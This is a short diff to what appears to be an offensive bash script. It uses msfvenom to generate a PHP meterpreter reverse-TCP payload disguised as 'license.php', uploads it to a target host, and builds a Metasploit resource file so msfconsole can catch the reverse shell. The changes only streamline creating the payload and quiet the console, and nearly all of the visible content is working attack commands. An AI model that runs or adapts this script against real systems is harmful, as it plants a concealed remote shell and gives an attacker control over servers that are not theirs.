@@ -72,9 +72,8 @@ then
 fi
 
 echo -e "${BLUE}[+] Creating reverse shell...${NOCOLOR}"
-msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=4443 -f raw -o shell.php
-cat shell.php | sed 's/^..//' > license.php
-rm -r shell.php
+msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=4443 -f raw -o license.php
+sed -i 's/^..//' license.php
 echo -e "${GREEN}[+] Reverse shell 'license.php' created!${NOCOLOR}"
 
 echo -e "${BLUE}[+] Uploading shell to $rhost:$rport...${NOCOLOR}"
@@ -99,4 +98,4 @@ echo set LPORT 4443 >> meterpreter.rc
 echo set LHOST $lhost >> meterpreter.rc
 echo set ExitOnSession false >> meterpreter.rc
 echo exploit -j -z >> meterpreter.rc
-msfconsole -r meterpreter.rc
+msfconsole -q -r meterpreter.rc
